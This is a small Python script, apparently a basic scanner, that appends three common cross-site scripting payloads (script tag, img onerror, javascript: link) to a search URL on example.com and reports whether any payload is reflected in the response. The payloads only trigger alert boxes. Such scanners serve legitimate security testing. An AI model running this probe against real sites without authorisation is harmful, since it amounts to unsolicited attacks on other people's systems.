import requests

def test_xss(url):
    xss_payloads = [
        "<script>alert('XSS');</script>",  
        "<img src='x' onerror='alert(1)'>",  
        "<a href='javascript:alert(1)'>Click me</a>",  
    ]

    for payload in xss_payloads:
        response = requests.get(url + payload)
        if payload in response.text:
            print(f"Possible XSS vulnerability found with payload: {payload}")

def main(url):
    print(f"Testing for XSS on {url}...")
    test_xss(url)

# Contoh penggunaan
main("http://example.com/search?q=")
